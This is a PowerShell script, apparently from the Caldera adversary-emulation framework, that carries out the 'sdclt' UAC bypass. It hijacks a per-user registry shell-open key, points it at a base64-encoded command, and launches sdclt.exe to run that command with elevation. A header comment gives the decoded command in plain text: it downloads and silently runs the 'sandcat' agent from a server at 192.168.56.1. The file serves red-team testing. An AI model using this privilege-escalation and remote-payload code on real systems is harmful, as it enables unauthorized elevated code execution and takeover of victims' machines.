# This code was derived from http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass
# Generated with
# echo '$server="http://192.168.56.1:8888";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");get-process | ? {$_.modules.filename -like "C:\\Users\Public\$name.exe"} | stop-process -f;rm -force "C:\\Users\Public\$name.exe" -ea ignore;[io.file]::WriteAllBytes("C:\\Users\Public\$name.exe",$data) | Out-Null;Start-Process -FilePath C:\\Users\Public\$name.exe -ArgumentList "-server $server -group bypass-UAC" -WindowStyle hidden;' | iconv -f ASCII -t UTF-16LE | base64
# To update the IP address or port of the caldera server, replace it in the command above and replace the encoded command below.

# IP: 192.168.56.1
function bypass {
New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value "powershell -exec bypass -Noninteractive -e JABzAGUAcgB2AGUAcgA9ACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANQA2AC4AMQA6
ADgAOAA4ADgAIgA7ACQAdQByAGwAPQAiACQAcwBlAHIAdgBlAHIALwBmAGkAbABlAC8AZABvAHcA
bgBsAG8AYQBkACIAOwAkAHcAYwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAu
AE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBhAGQA
ZAAoACIAcABsAGEAdABmAG8AcgBtACIALAAiAHcAaQBuAGQAbwB3AHMAIgApADsAJAB3AGMALgBI
AGUAYQBkAGUAcgBzAC4AYQBkAGQAKAAiAGYAaQBsAGUAIgAsACIAcwBhAG4AZABjAGEAdAAuAGcA
bwAiACkAOwAkAGQAYQB0AGEAPQAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABEAGEAdABhACgAJAB1
AHIAbAApADsAJABuAGEAbQBlAD0AJAB3AGMALgBSAGUAcwBwAG8AbgBzAGUASABlAGEAZABlAHIA
cwBbACIAQwBvAG4AdABlAG4AdAAtAEQAaQBzAHAAbwBzAGkAdABpAG8AbgAiAF0ALgBTAHUAYgBz
AHQAcgBpAG4AZwAoACQAdwBjAC4AUgBlAHMAcABvAG4AcwBlAEgAZQBhAGQAZQByAHMAWwAiAEMA
bwBuAHQAZQBuAHQALQBEAGkAcwBwAG8AcwBpAHQAaQBvAG4AIgBdAC4ASQBuAGQAZQB4AE8AZgAo
ACIAZgBpAGwAZQBuAGEAbQBlAD0AIgApACsAOQApAC4AUgBlAHAAbABhAGMAZQAoACIAYAAiACIA
LAAiACIAKQA7AGcAZQB0AC0AcAByAG8AYwBlAHMAcwAgAHwAIAA/ACAAewAkAF8ALgBtAG8AZAB1
AGwAZQBzAC4AZgBpAGwAZQBuAGEAbQBlACAALQBsAGkAawBlACAAIgBDADoAXABcAFUAcwBlAHIA
cwBcAFAAdQBiAGwAaQBjAFwAJABuAGEAbQBlAC4AZQB4AGUAIgB9ACAAfAAgAHMAdABvAHAALQBw
AHIAbwBjAGUAcwBzACAALQBmADsAcgBtACAALQBmAG8AcgBjAGUAIAAiAEMAOgBcAFwAVQBzAGUA
cgBzAFwAUAB1AGIAbABpAGMAXAAkAG4AYQBtAGUALgBlAHgAZQAiACAALQBlAGEAIABpAGcAbgBv
AHIAZQA7AFsAaQBvAC4AZgBpAGwAZQBdADoAOgBXAHIAaQB0AGUAQQBsAGwAQgB5AHQAZQBzACgA
IgBDADoAXABcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAJABuAGEAbQBlAC4AZQB4AGUAIgAs
ACQAZABhAHQAYQApACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AFMAdABhAHIAdAAtAFAAcgBvAGMA
ZQBzAHMAIAAtAEYAaQBsAGUAUABhAHQAaAAgAEMAOgBcAFwAVQBzAGUAcgBzAFwAUAB1AGIAbABp
AGMAXAAkAG4AYQBtAGUALgBlAHgAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAiAC0A
cwBlAHIAdgBlAHIAIAAkAHMAZQByAHYAZQByACAALQBnAHIAbwB1AHAAIABiAHkAcABhAHMAcwAt
AFUAQQBDACIAIAAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAGgAaQBkAGQAZQBuADsACgA="

New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute"
Start-Process -FilePath $env:windir\system32\sdclt.exe
Start-Sleep -s 3
Remove-Item -Path "HKCU:\Software\Classes\Folder" -Recurse
}
